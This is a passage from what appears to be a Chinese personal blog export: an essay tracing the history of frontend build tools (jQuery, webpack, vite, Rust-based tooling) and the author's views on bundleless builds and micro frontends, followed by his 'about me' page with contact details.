Opera，Safari，Chrome的问世，浏览器开始变得前所未有的普及。当然，因为浏览器变多，标准不统一，各个厂商的浏览器有细微的不同，让兼容性这个问题第一次摆在了网页制作者的面前。\n\n2005年，jquery出现了，目的是为了简化js操作/兼容浏览器。\n\n他让原来单纯的网页开发出现了很重要的变化：\n\n大部分的网页开发需要先声明一些依赖了\n\n对于依赖的普遍使用，让原本单纯的网页开发变得有点复杂起来了。即使到今天，用标签的方式引入react/jquery/lodash仍然是一个非常常见的操作。\n\n对于依赖的使用者而言比较简单，引入一个script标签即可。但是对于库的开发者来说，基于动态引入依赖方案的几个问题马上就摆在眼前：\n\n动态引入的依赖体积越小越好，怎么让源码开发的js文件更小呢？\n\n开发时可能会有多个js文件做模块拆分，最后怎么合并成一个mjs文件呢？\n\n这时候有一些基于其他语言的工具链，比如c++/python，但是非常的小众，仅仅一部分的库开发者在有限的使用，但对于前端构建而言，已经是海中的那一条道了。\n\n所罗门的圣殿\n\n2009年对于js世界来说，发生了两件重要的事情：\n\nnodejs/npm诞生了\n\nAngularJS诞生了\n\nnodejs的意义不仅在于后端开发，更重要的是让前端自己创建工具链的难度/要求大大的降低了，同时引入了npm这种中心化的包管理平台，让前端工程化有了物质基础。\n\nAngularJS这种基于模版/vdom的框架的诞生，不单单让前端大型应用成为可能，也让打包构建成为前端必备的一步。\n\n这时候，前端构建对于网页开发，已经是必备且重要的一步了。\n\n随后babel, webpack的出现，让前端彻底进入了黄金时代，第一圣殿已经建成了。\n\n巴比伦之囚\n\n时间到现在，出现了越来越多的构建工具/方案：\n\nvite：开发工具链，集成构建工具\nrome：基于rust的开发工具链\nesbuild：基于go的js打包工具\nswc：基于rust的js打包工具\n\n但是他们不像他们的前辈，马上就可以一鸣惊人，引领风潮，大部分都处在有讨论度，但是在生产环境少人问津的状态。\n\n因为前辈们珠玉在前，功能完善齐备，使用历史悠久，该踩的坑都踩了，如果没有在某个方面百倍的提升，实在是难以说服群众脱离对于惯性的依赖。\n\n就如同南北分裂后的巴比伦之囚们，在等待那一位弥赛亚。\n\n未来趋势\n\n我从不想未来，它来得太快。\n\n虽然现在的前端构建百家争鸣，但是他们身上仍然有一些共性，可以管中窥豹，未来的一些趋势。\n\nBundleless\n\n随着esm规范在浏览器的普及，bundleless的呼声/实践也越来越多，其中的代表是vite/esbuild。\n\n不考虑浏览器兼容性，bundleless的好处可以在于：\n\nhttp2普及/设备性能提升的背景/前提下，跨页面缓存率的提升\n\n开发阶段直接使用esm，仅更新修改文件带来的光速hmr\n\n可以看到，应用bundleless在c端其实是有风险的，对于低端设备甚至会是体验负优化。这和http2这种技术普及是有本质性的区别的，如果没有降级方案，起码5年内我觉得是不太适合在生产上大规模使用的，而降级方案，又会带来额外的工程复杂度。\n\n所以对于大公司应用bundleless在c端，个人认为是会很克制/滞后的。\n\n但是对于未来开发工具链而言，个人觉得一个趋势是必然采用类似vite的bundleless开发+bundle生产构建的方式。\n\nRust-based & Unify Toolchain\n\n可以很明显的看出，最近前端工具界对于用rust重写工具链是很有热情的. vercel的老哥甚至喊出了：\n\nRust Is The Future of JavaScript Infrastructure\n\n可以看出来，前端是越来越卷了。除了创造新的就业机会，用rust重写带来的收益也是很明显的，理想情况下性能方面会有百倍的提升。\n\n开发阶段的性能提升在大部分情况下其实蛮难说服大家更新工具的，甚至会感觉有点鸡肋，开发等待时间短了老子还怎么划水。\n\n但是量变带来质变，构建速度提升会让js打包这一件事情从耗时/异步，变成快速/同步，这对于CICD/内部工具来说，有些操作会变成可能。\n\n同时，随之出现的还有全工具链这个趋势。之前开发一个工程，大家会先eslint/prettier/stylelint/commitlint/tsconfig等等各种花活先整上，各个工具各司其职，让开发者自己去阻止起来。各大公司一般都有一套祖传开发框架，去做其中的一部分事情。\n\n但是近期出现的vite/rome，明显比webpack的指责范围更广，他们不单单想负责构建这件事，还想做devServer/lint一条龙服务。\n\n对于工具链而言，rust-based & unify会是一个靠谱的趋势，因为带来的提升还是比较明显的，也符合软件开发门槛越来越低的发展趋势，会缓慢但是稳定的发展下去。\n\nMicro Frontend\n\n微前端喊了好久, 但是相比于服务端的微服务化，无论是从普及，还是从效率的提升上，都是远远不及。现在前端微前端仍然是处于一个套个toolbar壳子的状态，可以去做工作台之类的集成，但是价值和场景也仅仅局限于此了。\n\n前端真正的微服务化应该是怎么样的呢，我说一下我理想中的情况：\n\n和其他前端应用有一个标准的通信机制\n\n和其他应用有一个标准的依赖共享机制\n\n框架无关性\n\n现在除了第三点，1/2点都是差强人意的，1的话很好理解，如同rpc之于后端，是一个互相通信的方式，在前端甚至更好实现。2的话就是很独特的前端要解决的问题了，我个人觉得也是现在微服务一个最大的bottleneck，无法去共享依赖，让微服务很难真的去做到\"微\"。\n\n如果是真的微，那么应该是去做到组件式的微服务，拼成一个前端页面就像搭建组件一样轻松自然。前端组件也像后端服务一样，严格定义io，对于团队分工/前端效率应该都会是一个很大的提升。\n\nwebpack5的Module Federation是一个很好的尝试，但是个人感觉方案不够成熟，难用且不好接入现有开发模式。\n\nWeb开发方式\n\n有个蛮有意思的说法：\n\n● 语言 < 库 < 框架 < 引擎\n\nweb前端其实和游戏客户端开发有点相似，只不过标准/生态更加的统一。游戏有商用的引擎，游戏开发/运营/美术都能用，还有资产中心，等同于搭建平台的开发/运营/交互，外加组件市场。\n\nweb企业级开发的终极形态，应该就是web开发引擎，组件开发可以在上面快速的开发/debug，运营配合蓝图搭建页面，交互在上面管理自己的美术资产。\n\nEnd\n\n随着操作系统和硬件的交互能力越来越完善(WebGPU/WebHID)和wasm的普及，个人感觉浏览器会越来越操作系统化，能力会越来越强，从长期来看非常看好浏览器使用场景的扩展。\n\n随着前端场景的扩展，使用复杂度的提升，对于构建这件事的要求肯定会是越来越高的，模式/性能都会是未来发展的重点。\n\nReference\n\nNext.js: Rust-based Tooling\nWhy write Rome in Rust\nJavaScript 二十年\nice RFC: 解耦 babel，支持 swc\nLee Robinson: Rust Is The Future of JavaScript Infrastructure\n","title":"对于前端构建的一点思考"},"index.html":{"content":"关于我\n\n博主名叫黄雨辰，网上用的比较多的名称是Bert.\n\n原本在Github上就有写作记录的习惯，乘着2021年的春节假期，就把那些md的文件归档为一个静态的博客网站啦。\n\n支持一下本站\n\n坚持写作是一件很不易的事情，如果你认为我的文章对你有帮助，欢迎将本站推荐给你的小伙伴！\n\n联系我\n\n> If you would like to right a wrong or are interested in me, welcome to contact me.\n\nemail：yuchenhuang0324@gmail.com\nwechat: bertkk\n","title":"关于我"}}